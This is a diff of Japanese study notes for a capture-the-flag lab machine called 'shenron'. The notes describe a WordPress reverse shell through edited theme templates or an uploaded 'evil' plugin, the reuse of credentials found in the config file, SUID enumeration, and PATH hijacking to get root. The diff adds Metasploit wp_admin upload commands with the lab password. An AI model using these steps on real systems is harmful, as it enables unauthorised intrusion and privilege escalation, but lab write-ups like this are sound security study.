@@ -32,13 +32,18 @@
   - websiteから起動する
   - `http://shenron/wp-content/themes/twentyeleven/archive.php`または404 Templateに書いた場合はarchive.phpを404.phpにする
   - これでもできない場合は、php-reverse-shellが間違っているので新しいのをとってくる。
-  - (追記)pluginでもできる。下に書いてある
+  - (追記1)pluginでもできる。下に書いてある
+  - (追記2)msfconsoleの`search wp_admi upload`でもできる。注意はusernameはshenronでなく、admin。pluginができるのでできる/var/www/html/wp-content/plugins/ランダム名
 - ユーザを調べる
   - shenronがいる 
 - 設定ファイルを見る
   - wordpress:Wordpress@123
+- MySQLに接続する
+  - wordpress:Wordpress@123
+  - 何があるか?
 - shenronにユーザを変える
   - `su shenron`
+  - ここでは初めのiloverockyouのパスワードだったが、MySQLで得られたパスワードが必要かもしれない
 - SUIDを調べる
   - `find / -perm -u=s -type f 2>/dev/null`
   - /home/shenron/networkがあるpkexecもいけそう   
@@ -53,7 +58,7 @@
   - netstatコマンドを見るとroot権限で動いているのがわかる
 - PATHハイジャックでrootを取得する。これはroot権限で実行されているコマンドを特定のユーザに置いているのが脆弱性
 - PATHハイジャックを利用してrootになる要件
-  - 所有者がroot
+  - netstatコマンドの所有者がroot(rootになる必要ないなら、これはいらない)
   - 誰でも実行できる
   - 内部のコマンドがフルパスで書かれていない
 
@@ -68,7 +73,7 @@ cd /home/shenron
 - rootになれる
 
 ## 補足
-- pluginでする
+### pluginでする
 - php-reverse-shell.phpをコピーして名前をevil.phpにして用意しておく
 - 次のファイル、banner.phpを作る
 
@@ -89,3 +94,20 @@ Author URI: http://evil
 - Plugins一覧から、さっきUploadしたのをactivateすると色が変わる
 - Parrotで待ち受ける
 - ブラウザから次にアクセスする`http://shenron/wp-content/plugins/evil/evil.php` 
+
+### metasploit
+- pluginでやったのと同じことをmsfconsoleを使ってすることができる
+- ハッキングラボ cf920を参照
+
+```
+msfconsole -q
+search wp_admin
+use 0
+set username admin
+set password iloverockyou
+set rhosts ターゲットのアドレス
+set lhost 自分のアドレス
+run
+```
+
+- 対話型のシェルにする
